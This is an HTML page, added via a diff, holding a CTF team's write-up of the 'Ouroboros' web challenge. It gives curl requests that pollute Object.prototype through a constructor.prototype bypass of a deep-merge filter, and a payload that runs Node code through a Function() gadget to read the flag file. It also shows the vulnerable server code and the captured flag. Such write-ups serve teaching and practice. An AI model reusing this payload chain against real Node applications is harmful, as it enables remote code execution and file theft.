@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Ouroboros · HICyberCon CTF 2026 writeup · NXT_CTFS</title>
+<meta name="description" content="A deep-merge drops keys named __proto__ but not a nested constructor.prototype, so Object.prototype.formula can be polluted. The preview handler reads formula off a fresh object and runs it through new Function, giving code execution that echoes the flag file back." />
+<link rel="icon" href="../images/brand/logo-v2.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=80d02232" />
+<link rel="stylesheet" href="../css/base.css?v=158fffd0" />
+<link rel="stylesheet" href="../css/components.css?v=9bb4ee8e" />
+<link rel="stylesheet" href="../css/pages.css?v=15906e9c" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <a href="../index.html#top" class="brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">try a box</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">try a box</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="page-main container" id="top">
+  <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#top">nxt_ctfs</a> <span aria-hidden="true">/</span> <a href="../writeups.html">writeups</a> <span aria-hidden="true">/</span> <a href="../events/hicybercon-ctf-2026.html">hicybercon-ctf-2026</a> <span aria-hidden="true">/</span> <span>ouroboros-hicybercon</span></nav>
+
+  <header class="page-head">
+    
+    <div class="page-head-body">
+      <h1>Ouroboros <span class="page-sub">Prototype pollution to a new Function gadget</span></h1>
+      <div class="page-meta"><span class="wu-cat wu-cat-web">web</span></div>
+      
+      <div class="wu-flagrow">
+        <span class="wu-flagrow-k">flag</span>
+        <code id="wuFlag">hiCTF{pr0to_pollution_to_cust0m_new_Function_gadget_rce_d4d9ba5c06}</code>
+        <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+      </div>
+    </div>
+  </header>
+
+    <div class="wu-layout">
+    <article class="wu-article">
+<p>Instance: <code>https://ouroboros-&lt;hash&gt;.chall.hiddeninvestigations.net</code> (rCTF, 20-min lifetime).
+Flag file on the box: <code>/flag/flag.txt</code> (also <code>/flag.txt</code> symlink). Node v20.20.2, cwd <code>/app</code>.</p>
+<h2 id="tldr-the-chain"><a class="wu-anchor" href="#tldr-the-chain" aria-hidden="true">#</a>TL;DR - the chain</h2>
+<ol>
+<li><strong>Prototype pollution</strong> via the deep-merge: it drops keys literally named <code>__proto__</code> but not a
+nested <code>constructor</code> → <code>settings.a.constructor.prototype</code> writes to <code>Object.prototype</code>.</li>
+<li>The preview handler builds a <strong>fresh empty object</strong> <code>const view = {}</code> and reads <code>view.formula</code>
+off the prototype chain - so our PP&#39;d <code>Object.prototype.formula</code> is seen.</li>
+<li>It then runs <code>String(Function(&#39;data&#39;, view.formula)(locals))</code> - a <strong>custom <code>new Function</code> gadget</strong>.
+That&#39;s arbitrary JS execution in global scope, with <code>process</code> available.</li>
+<li><code>computed</code> is echoed back into the rendered HTML → we exfiltrate the flag from the response.</li>
+</ol>
+<h2 id="the-two-requests"><a class="wu-anchor" href="#the-two-requests" aria-hidden="true">#</a>The two requests</h2>
+<figure class="wu-code" data-lines="12">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-comment"># 1) log in (any username, no password)</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">curl -c jar -X POST -d <span class="hljs-string">&#x27;username=x&#x27;</span> <span class="hljs-variable">$H</span>/api/login</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc"><span class="hljs-comment"># 2) prototype-pollute Object.prototype.formula  (bypasses the __proto__ filter)</span></span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">curl -b jar -X POST -H <span class="hljs-string">&#x27;content-type: application/json&#x27;</span> \</span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">  --data-raw <span class="hljs-string">&#x27;{&quot;settings&quot;:{&quot;a&quot;:{&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;formula&quot;:</span></span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc"><span class="hljs-string">     &quot;return process.mainModule.require(\&quot;fs\&quot;).readFileSync(\&quot;/flag/flag.txt\&quot;,\&quot;utf8\&quot;)&quot;}}}}}&#x27;</span> \</span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">  <span class="hljs-variable">$H</span>/api/report/config</span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="10"><span class="wu-ln">10</span><span class="wu-lc"><span class="hljs-comment"># 3) render the preview -&gt; the evaluated result lands in &lt;div class=&quot;computed&quot;&gt;</span></span></span>
+<span class="wu-line" data-line="11"><span class="wu-ln">11</span><span class="wu-lc">curl -b jar -X POST -H <span class="hljs-string">&#x27;content-type: application/json&#x27;</span> \</span></span>
+<span class="wu-line" data-line="12"><span class="wu-ln">12</span><span class="wu-lc">  --data-raw <span class="hljs-string">&#x27;{&quot;data&quot;:{&quot;title&quot;:&quot;T&quot;,&quot;body&quot;:&quot;B&quot;}}&#x27;</span> <span class="hljs-variable">$H</span>/api/report/preview</span></span></code></pre>
+      
+    </figure><p>Response:</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">html</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-html">&lt;section class=&quot;report&quot;&gt;&lt;h1&gt;T&lt;/h1&gt;&lt;small&gt;…&lt;/small&gt;&lt;div class=&quot;body&quot;&gt;B&lt;/div&gt;
+&lt;div class=&quot;computed&quot;&gt;hiCTF{pr0to_pollution_to_cust0m_new_Function_gadget_rce_d4d9ba5c06}&lt;/div&gt;&lt;/section&gt;</code></pre>
+      
+    </figure><h2 id="why-the-obvious-things-were-dead-ends-kept-for-the-record"><a class="wu-anchor" href="#why-the-obvious-things-were-dead-ends-kept-for-the-record" aria-hidden="true">#</a>Why the obvious things were dead ends (kept for the record)</h2>
+<ul>
+<li><strong>EJS</strong> is ≥3.1.10: <code>Template</code>&#39;s opts are a null-proto copy (<code>hasOwnOnlyObject</code>) and
+<code>shallowCopyFromList</code> has a <code>hasOwn</code> guard, so PP can&#39;t reach <code>escapeFunction</code> / <code>outputFunctionName</code>.
+The app uses <code>ejs.render(str, locals)</code> (2-arg), never <code>res.render</code>/<code>renderFile</code> - so the classic
+<code>settings[&#39;view options&#39;]</code> chain is unreachable too. Only EJS <em>delimiters</em> are PP-reachable.</li>
+<li><strong>Delimiter trick</strong> (PP <code>openDelimiter</code>/<code>delimiter</code>/<code>closeDelimiter</code>) only turns literal template
+text into bare-identifier expressions; the template has no <code>(</code> <code>)</code>, so no calls → harmless.</li>
+<li><code>computed</code> was never controlled by <code>config.*</code> or <code>data.*</code> - only by <strong>prototype</strong> pollution,
+because the app reads it from a fresh <code>{}</code> (<code>view</code>), not from <code>reportConfig</code> or <code>data</code>.</li>
+<li><code>data.filename</code> reaching <code>path.basename</code> (the <code>path argument must be a string</code> error) is EJS&#39;s
+<code>filename</code> option, not an app file-read sink.</li>
+<li>PP <code>encoding</code> crashing every POST is <code>raw-body</code> (<code>&#39;encoding&#39; in options</code> walks the prototype).</li>
+</ul>
+<h2 id="the-actual-sink-recovered-appserverjs"><a class="wu-anchor" href="#the-actual-sink-recovered-appserverjs" aria-hidden="true">#</a>The actual sink (recovered <code>/app/server.js</code>)</h2>
+<figure class="wu-code" data-lines="22">
+      <figcaption>
+        
+        <span class="wu-code-lang">js</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-js"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deepMerge</span>(<span class="hljs-params">target, source</span>) {</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(source)) {</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">    <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) <span class="hljs-keyword">continue</span>;            <span class="hljs-comment">// &lt;-- the &quot;already filtered&quot; thing</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">    <span class="hljs-keyword">const</span> sv = source[key];</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">    <span class="hljs-keyword">if</span> (sv !== <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-keyword">typeof</span> sv === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; !<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(sv)) {</span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">      <span class="hljs-keyword">if</span> (target[key] === <span class="hljs-literal">null</span> || <span class="hljs-keyword">typeof</span> target[key] === <span class="hljs-string">&#x27;undefined&#x27;</span>) target[key] = {};</span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">      <span class="hljs-title function_">deepMerge</span>(target[key], sv);                 <span class="hljs-comment">// &lt;-- constructor.prototype -&gt; Object.prototype</span></span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">    } <span class="hljs-keyword">else</span> { target[key] = sv; }</span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc">  }</span></span>
+<span class="wu-line" data-line="10"><span class="wu-ln">10</span><span class="wu-lc">}</span></span>
+<span class="wu-line" data-line="11"><span class="wu-ln">11</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="12"><span class="wu-ln">12</span><span class="wu-lc">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/report/preview&#x27;</span>, requireSession, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {</span></span>
+<span class="wu-line" data-line="13"><span class="wu-ln">13</span><span class="wu-lc">  <span class="hljs-keyword">const</span> data  = (req.<span class="hljs-property">body</span> &amp;&amp; req.<span class="hljs-property">body</span>.<span class="hljs-property">data</span>) || {};</span></span>
+<span class="wu-line" data-line="14"><span class="wu-ln">14</span><span class="wu-lc">  <span class="hljs-keyword">const</span> locals = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({ <span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;Untitled Report&#x27;</span>, <span class="hljs-attr">body</span>:<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-attr">footer</span>: reportConfig.<span class="hljs-property">footer</span> }, data);</span></span>
+<span class="wu-line" data-line="15"><span class="wu-ln">15</span><span class="wu-lc">  <span class="hljs-keyword">const</span> view  = {};                               <span class="hljs-comment">// &lt;-- fresh object, inherits Object.prototype</span></span></span>
+<span class="wu-line" data-line="16"><span class="wu-ln">16</span><span class="wu-lc">  <span class="hljs-keyword">let</span> computed = <span class="hljs-string">&#x27;&#x27;</span>;</span></span>
+<span class="wu-line" data-line="17"><span class="wu-ln">17</span><span class="wu-lc">  <span class="hljs-keyword">if</span> (view.<span class="hljs-property">formula</span>) {                             <span class="hljs-comment">// &lt;-- PP&#x27;d Object.prototype.formula seen here</span></span></span>
+<span class="wu-line" data-line="18"><span class="wu-ln">18</span><span class="wu-lc">    <span class="hljs-keyword">try</span> { computed = <span class="hljs-title class_">String</span>(<span class="hljs-title class_">Function</span>(<span class="hljs-string">&#x27;data&#x27;</span>, view.<span class="hljs-property">formula</span>)(locals)); }  <span class="hljs-comment">// &lt;-- the gadget</span></span></span>
+<span class="wu-line" data-line="19"><span class="wu-ln">19</span><span class="wu-lc">    <span class="hljs-keyword">catch</span> (e) { computed = <span class="hljs-string">&#x27;formula error&#x27;</span>; }</span></span>
+<span class="wu-line" data-line="20"><span class="wu-ln">20</span><span class="wu-lc">  }</span></span>
+<span class="wu-line" data-line="21"><span class="wu-ln">21</span><span class="wu-lc">  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>).<span class="hljs-title function_">send</span>(ejs.<span class="hljs-title function_">render</span>(<span class="hljs-variable constant_">REPORT_TEMPLATE</span>, <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(locals, { computed })));</span></span>
+<span class="wu-line" data-line="22"><span class="wu-ln">22</span><span class="wu-lc">});</span></span></code></pre>
+      
+    </figure><p>Note the <code>view = {}</code> looks like leftover scaffolding (intended to hold view options) that was never
+wired up - it reads <code>view.formula</code>, and because <code>view</code> is a plain object, global prototype pollution
+is enough to plant the formula. Same for the deep-merge: <code>Object.keys()</code> + a <code>__proto__</code>-only check
+means <code>constructor.prototype</code> is the bypass. The challenge&#39;s &quot;no eval&quot; is literally false - the
+gadget is <code>Function(...)</code>.</p>
+
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#tldr-the-chain">TL;DR - the chain</a></li><li><a href="#the-two-requests">The two requests</a></li><li><a href="#why-the-obvious-things-were-dead-ends-kept-for-the-record">Why the obvious things were dead ends (kept for the record)</a></li><li><a href="#the-actual-sink-recovered-appserverjs">The actual sink (recovered /app/server.js)</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev wu-pager-index" href="../events/hicybercon-ctf-2026.html"><span class="wu-pager-dir">Competition</span><span class="wu-pager-name">HICyberCon CTF 2026</span></a>
+    <a class="wu-pager-link wu-pager-next" href="overgrowth.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">Overgrowth</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=2912532e"></script>
+</body>
+</html>
